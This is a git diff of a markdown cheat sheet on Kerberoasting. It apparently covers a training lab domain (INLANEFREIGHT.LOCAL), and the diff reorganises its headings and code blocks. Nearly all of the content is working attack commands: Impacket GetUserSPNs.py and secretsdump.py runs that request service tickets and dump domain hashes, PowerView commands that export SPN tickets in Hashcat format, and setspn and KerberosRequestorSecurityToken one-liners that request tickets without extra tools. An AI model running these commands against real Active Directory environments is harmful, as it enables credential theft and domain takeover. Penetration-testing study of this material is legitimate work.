@@ -1,6 +1,6 @@
 # Kerberoasting
 
-## Enumeration
+### Linux
 
 ```
 ============ From Linux ============
@@ -17,7 +17,10 @@ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/user:password -request-user
 
 # Secretdumps
 secretsdump.py -just-dc domain/admin@dc-ip
+```
 
+### Windows
+```
 ============ From Windows ============
 # SPN Users
 Import-Module .\PowerView.ps1
@@ -27,13 +30,14 @@ Get-DomainUser -LDAPFilter "(&(servicePrincipalName=*)(admincount=1))" | Select 
 Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
 tr -d ' \n' < messy_hash.txt > clean_hash.txt
 
-Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
 
 # SetSPN
 setspn.exe -Q */*
 setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+```
 
-# Toolsuz Kerberoasting
+### Toolsuz Kerberoasting
+```
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
 
